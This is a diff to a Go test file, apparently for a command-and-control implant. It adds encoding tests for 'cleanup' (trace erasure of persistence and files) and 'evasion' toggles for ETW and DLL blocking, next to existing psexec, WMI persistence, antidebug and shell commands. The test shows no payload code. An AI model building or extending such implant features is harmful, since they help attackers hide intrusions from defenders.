@@ -75,6 +75,14 @@ func TestResolveCommandEquivalence(t *testing.T) {
 		{"psexec", "psexec host cmd", append(uint32Bytes(command1.PSEXEC), []byte("host cmd")...), true},
 		{"wmi_persist", "wmi_persist add X", append(uint32Bytes(command1.WMI_PERSIST), []byte("add X")...), true},
 		{"antidebug", "antidebug", uint32Bytes(command1.ANTIDEBUG), true},
+		// 清理现场（P1）：无参 = 全范围；带参走前缀表
+		{"cleanup", "cleanup", uint32Bytes(command1.CLEANUP), true},
+		{"cleanup_scope", "cleanup persist files", append(uint32Bytes(command1.CLEANUP), []byte("persist files")...), true},
+		// 运行期对抗开关（P4）：无参 = 状态表；"on/off <能力>" 走前缀表原样透传
+		{"evasion", "evasion", uint32Bytes(command1.EVASION), true},
+		{"evasion_status", "evasion status", append(uint32Bytes(command1.EVASION), []byte("status")...), true},
+		{"evasion_on", "evasion on etw", append(uint32Bytes(command1.EVASION), []byte("on etw")...), true},
+		{"evasion_off", "evasion off block_dlls", append(uint32Bytes(command1.EVASION), []byte("off block_dlls")...), true},
 		{"default_shell", "whoami", append(uint32Bytes(command1.SHELL), []byte("whoami")...), true},
 	}
 
